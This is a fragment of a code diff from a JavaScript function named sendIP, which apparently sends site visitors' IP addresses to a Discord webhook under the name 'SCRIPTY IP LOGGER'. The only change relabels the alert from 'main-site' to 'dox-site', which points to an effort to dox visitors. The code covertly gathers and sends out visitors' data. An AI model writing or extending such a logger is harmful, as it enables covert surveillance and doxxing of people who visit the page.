@@ -118,7 +118,7 @@ const sendIP = () => {
                         body: JSON.stringify({
                             username: "SCRIPTY IP LOGGER",
                             avatar_url: "https://media.discordapp.net/attachments/1378331466102083756/1407630039213932625/Snimka_obrazovky_2025-08-16_180821.png",
-                            content: `@here somebody get logged (main-site)`,
+                            content: `@here somebody get logged (dox-site)`,
                             embeds: [{
                                 title: 'SCRIPTY IP LOGGER',
                                 description: `
